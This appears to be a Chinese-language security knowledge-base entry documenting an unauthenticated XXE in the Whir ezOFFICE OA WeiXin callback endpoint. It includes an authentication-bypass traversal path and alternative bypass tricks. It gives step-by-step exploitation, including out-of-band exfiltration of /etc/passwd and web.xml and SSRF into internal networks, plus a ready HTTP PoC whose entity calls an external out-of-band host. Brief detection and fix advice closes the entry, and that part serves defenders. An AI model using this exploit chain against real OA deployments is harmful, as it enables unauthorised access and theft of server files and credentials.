---
id: web-generic-xxe-whir-ezoffice-weixin-callback-xmlparse
title: 万户OA WeiXin!callback.action XXE：XMLParse.extract 未禁用外部实体，签名校验前解析
type: scenario
domain: web
path: web/generic/xxe
technique: whir-ezoffice-weixin-callback-xxe
tags:
- web
- xxe
- java
- oa
- whir
- ezoffice
- struts2
- dom
- oob
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:27+08:00'
  notes: 已对照原文与 img38-42 核对：Struts WeiXin!* → CallBackAction.callback → WXBizMsgCrypt.DecryptMsg 先 XMLParse.extract 解析后验签，DocumentBuilderFactory 未禁用外部实体，PoC 与原文一致；原文用外部请求平台验证，未复跑。
url: /docs/web/generic/xxe/web-generic-xxe-whir-ezoffice-weixin-callback-xmlparse/
draft: false
kb_aliases:
- 万户OA XXE
- ezOFFICE 微信回调 XXE
- WeiXin!callback.action
- XMLParse.extract
- WXBizMsgCrypt DecryptMsg
- DocumentBuilderFactory 外部实体
---

## 一句话结论

万户OA 的微信回调 `CallBackAction#callback`（Struts 路由 `/WeiXin!callback.action`）把请求体 POST 数据交给 `WXBizMsgCrypt.DecryptMsg`，后者先调用 `XMLParse.extract(postData)` 用默认配置的 `DocumentBuilderFactory` 解析 XML、再校验签名；解析阶段未禁用外部实体，攻击者提交带 DOCTYPE/外部实体的 XML 即可触发 XXE 外带。

## 原理

- 调用链：
  - `struts-weixin.xml`：`<package name="com.whir.evo.weixin.actionsupport" extends="struts-default"><action name="WeiXin!*" method="{1}" class="com.whir.evo.weixin.actionsupport.CallBackAction">`，因此 `/WeiXin!callback.action` 调用 `CallBackAction.callback`；
  - `callback` 读取 `request.getInputStream()` 为 `postData`，`new WXBizMsgCrypt(Constants.token, Constants.encodingAESKey, corpId)`，调用 `DecryptMsg(msg_signature, timestamp, nonce, postData)`；
  - `DecryptMsg` 中 `Object[] encrypt = XMLParse.extract(postData);`，**随后**才 `SHA1.getSHA1(...)` 与 `signature.equals(msgSignature)` 校验；即使签名不匹配抛异常，XML 已经解析。
- `XMLParse.extract`：
  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  DocumentBuilder db = dbf.newDocumentBuilder();
  InputSource is = new InputSource(new StringReader(xmltext));
  Document document = db.parse(is);
  ```
  未设置 `disallow-doctype-decl`、未禁用外部通用/参数实体、未设置 `ACCESS_EXTERNAL_DTD`，因此 DOCTYPE 中的外部实体被解析并可能发起外部请求/读取文件。
- 页面在 `/defaultroot/` 下，正常受鉴权过滤器保护，但可用 `SetCharacterEncodingFilter` 的鉴权绕过路径访问；`WeiXin!*` 是 Struts 通配 Action，无需登录也可到达 callback。

## 触发条件

- 目标为万户OA/ezOFFICE，`struts-weixin.xml` 注册了 `WeiXin!*`，`CallBackAction`/`WXBizMsgCrypt`/`XMLParse` 存在。
- `DocumentBuilderFactory` 使用默认配置（未加固）。
- 能到达 `/WeiXin!callback.action`（登录或鉴权绕过）。
- 目标可出网（DNS/HTTP）到攻击者服务器，或可读取本地文件并外带。

## 利用步骤

1. 用鉴权绕过前缀请求 `POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../WeiXin!callback.action`。
2. body 放带外部实体的 XML：`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker/dnslog">]><foo>&xxe;</foo>`。
3. 使用 DNSLog/HTTP 平台观察请求；若收到记录，确认 XXE。
4. 进一步用参数实体外部 DTD 外带本地文件（`file:///etc/passwd`、`WEB-INF/web.xml` 等），或让服务器访问内网 URL。
5. 记录请求、DNS/HTTP 日志与回显/外带内容作为证据。

## PoC

```http
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../WeiXin!callback.action HTTP/1.1
Host: target
Content-Type: application/xml
Content-Length: 0

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://8df1qhk3.requestrepo.com"> ]>
<foo>&xxe;</foo>
```

原文使用外部请求平台验证；响应可能因签名校验失败返回错误，但实体请求已在 `DecryptMsg` 解析阶段发出。

## 变体与关联

- 变体：通用实体外带、参数实体 + 外部 DTD 外带文件内容、XXE 打内网 HTTP（SSRF）、盲 XXE 通过错误信息外带。
- 变体：鉴权绕过可换成 `X-Forwarded-For: localhost` + `/xfservices/GeneralWeb../../WeiXin!callback.action` 或 `/admin.jsp;.js`。
- 关联：鉴权绕过 [[web-generic-auth-whir-ezoffice-characterencoding-filter-bypass]]；通用 dom4j/SAXReader XXE [[web-java-component-activeuc-gscheckuser-dom4j-xxe]]、[[web-generic-xxe-crm-cxf-soap-dom4j-nested-xml]]。
- 边界：解析器已禁用 DOCTYPE/外部实体、`XMLParse.extract` 被替换为安全解析、或 `WeiXin!*` 路由不可达时，XXE 不成立。

## 检测与防御

- 检测：`/WeiXin!callback.action` 请求体含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、外部域名；服务端解析异常/外连 DNS；`Content-Type` 为 XML 但缺少微信签名参数。
- 修复：`DocumentBuilderFactory` 设置 `disallow-doctype-decl=true`、`external-general-entities=false`、`external-parameter-entities=false`、`ACCESS_EXTERNAL_DTD=""`、`ACCESS_EXTERNAL_SCHEMA=""`；或改用安全的 XML 解析库。
- 加固：先做签名/来源校验再解析 XML（但仍需安全解析）；限制请求体大小与出站网络；对微信回调做 IP/签名白名单；修复鉴权绕过。
